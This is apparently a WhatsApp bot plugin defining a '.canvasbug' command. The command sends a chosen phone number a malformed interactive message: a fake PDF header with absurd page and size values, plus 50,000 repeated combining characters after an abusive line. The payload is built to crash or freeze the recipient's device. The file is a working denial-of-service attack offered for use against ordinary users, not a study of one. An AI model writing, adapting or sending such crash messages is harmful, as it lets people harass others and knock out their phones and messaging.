const { cmd ,commands } = require('../lib/command');
const { exec } = require('child_process');
const config = require('../settings');
const {sleep} = require('../lib/functions')

cmd({
  pattern: "bug",
  use: ".canvasbug <@user> or <number>",
  category: "fun",
  desc: "Canvas Bug Function by sulaksha",
  filename: __filename
}, async (conn, m, mek, { args, reply }) => {
  if (!args[0]) return await reply("*Reply to a user or provide a number!* (ex: .canvasbug 9471xxxxxxx)");

  let target = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  let uitext = "𝐅𝐔𝐂𝐊 𝐘𝐎𝐔𝐑 𝐃𝐄𝐕𝐈𝐂𝐄 𝐁𝐀𝐁𝐘 " + "꧀".repeat(50000);

  try {
    await conn.relayMessage(target, {
      groupMentionedMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: 'https://mmg.whatsapp.net/v/t62.7119-24/19392659_857576149596887_4268823484878612019_n.enc?ccb=11-4&oh=01_Q5AaIOQvG2wK688SyUp4JFWqGXhBQT6m5vUcvS2aBi0CXMTv&oe=676AAEC6&_nc_sid=5e03e0&mms3=true',
                mimetype: 'application/pdf',
                fileSha256: "NpR4V+tVc+N2p3zZgKO9Zzo/I7LrhNHlJxyDBxsYJLo=",
                fileLength: "999999999",
                pageCount: 0x9184e729fff,
                mediaKey: "6l+ksifBQsLHuJJGUs5klIE98Bv7usMDwGm4JF2rziw=",
                fileName: "unidentifiedMessageType",
                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                directPath: '/v/t62.7119-24/19392659_857576149596887_4268823484878612019_n.enc?ccb=11-4&oh=01_Q5AaIOQvG2wK688SyUp4JFWqGXhBQT6m5vUcvS2aBi0CXMTv&oe=676AAEC6&_nc_sid=5e03e0',
                mediaKeyTimestamp: "1715880173",
                contactVcard: true
              },
              title: "",
              hasMediaAttachment: true
            },
            body: {
              text: uitext
            },
            nativeFlowMessage: {},
            contextInfo: {
              mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
              groupMentions: [{ groupJid: "1@newsletter", groupSubject: "tske" }]
            }
          }
        }
      }
    }, { participant: { jid: target } }, { messageId: null });

    await reply("✅ Canvas Bug sent to: " + target);
  } catch (e) {
    console.error(e);
    await reply("❌ Failed to send bug message.");
  }
});
